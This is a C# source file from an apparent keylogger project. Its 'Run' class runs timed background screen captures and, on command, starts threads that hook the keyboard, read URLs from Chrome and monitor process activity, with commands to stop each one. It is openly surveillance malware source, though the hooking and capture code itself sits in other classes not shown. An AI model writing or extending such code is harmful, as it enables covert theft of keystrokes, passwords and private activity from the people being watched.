using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace key.KeyLogger
{
    public class Run
    {
        public Thread threadtime;
        public Thread thread;
        public Thread thread1;
        public Thread thread2;

        private static Run _Instance;

        public static Run Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new Run();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public Run() { }


        public void StartCapture(int timer)
        {
            threadtime = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(timer);
                    KeyLogger.Capture.Instance.CaptureScreen();
                }
            });
            threadtime.IsBackground = true;
            threadtime.Start();
        }

        public void RunThread(string request)
        {
            if (request == "run all")
            {
                thread = new Thread(KeyLogger.ProcessActivity.Instance.NotificationWhenActivate);
                thread.TrySetApartmentState(ApartmentState.STA);
                thread.Start();

                thread1 = new Thread(KeyLogger.GetURLfromChrome.Instance.Checkurl);
                thread1.TrySetApartmentState(ApartmentState.STA);
                thread1.Start();

                thread2 = new Thread(KeyLogger.KeyBoard.HookKeyboard);
                thread2.TrySetApartmentState(ApartmentState.STA);
                thread2.Start();

            }
            if (request == "kill appActivity")
            {
                thread.Abort();
            }
            if (request == "kill CheckURL")
            {
                thread1.Abort();
            }
            if (request == "kill HookKeyboard")
            {
                thread2.Abort();
            }
        }
    }
}
